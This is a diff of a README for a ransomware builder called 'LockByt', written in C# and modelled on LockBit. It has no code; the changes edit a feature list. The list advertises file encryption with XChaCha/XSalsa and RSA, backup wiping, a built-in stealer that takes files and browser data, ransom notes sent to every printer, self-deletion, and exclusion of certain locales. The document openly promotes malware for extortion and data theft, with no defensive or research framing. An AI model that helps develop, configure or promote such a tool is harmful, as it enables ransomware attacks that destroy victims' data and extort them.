@@ -8,9 +8,9 @@ LockByt Ransomware Builder
 Do **NOT** Expect this to be Fast as LockBit, Due to Limitations of .NET 4 (C#) this is the best i could do,LockBit is written in a Native Language (C) it is **DEFINITELY** faster Than LockByt.
 
 ## Features
-- **Algorithm Switching**
+- **Symmetric Algorithm Switching** (XChaCha and XSalsa only)
 - **XChaCha/XSalsa with Configurable Rounds** (8/12/20)
-- **RSA with Configurable Bits** (1024/2048/3072/4096)
+- **RSA with Configurable Bits and Format** (1024/2048/3072/4096, Formats: PEM,XML. when loading a public key its automatically detected)
 - **Backup Wipe**
 - **Built In Stealer** (StealByt, Steals 500MB of Important files,Browser Files,Application File's, Harvest-Now-Decrypt-Later)
 - **Print Ransom Note on All Printers**
@@ -28,7 +28,6 @@ Do **NOT** Expect this to be Fast as LockBit, Due to Limitations of .NET 4 (C#) 
 - **Open Ransom Note**
 - **Melt**
 - **Mutex**
-- **IOCP Async I/O**
 - **Excluded Languages** (example: ru-RU,tr-TR,uk-UA)
 - **List** (List to process hardcoded list)
 
